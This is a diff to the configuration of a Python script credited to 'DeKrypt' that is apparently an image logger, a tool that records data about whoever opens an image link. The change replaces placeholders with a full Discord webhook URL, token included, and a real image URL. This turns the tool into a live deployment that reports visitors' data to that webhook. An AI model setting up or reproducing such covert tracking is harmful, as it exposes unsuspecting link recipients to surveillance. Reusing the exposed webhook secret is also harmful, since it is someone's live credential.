@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1139031416735289465/ADH8rmwjQSzAVutH-j3CeWr6tA6wvBuR56harXZAG7bNDmApasjeVKPv4BawlyTzvhgu",
+    "image": "https://static.wikia.nocookie.net/dragonball-next-future/images/2/2e/D7d9fbf3f6aa6d81699ac03f72c5a682.jpg/revision/latest?cb=20220807193554", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
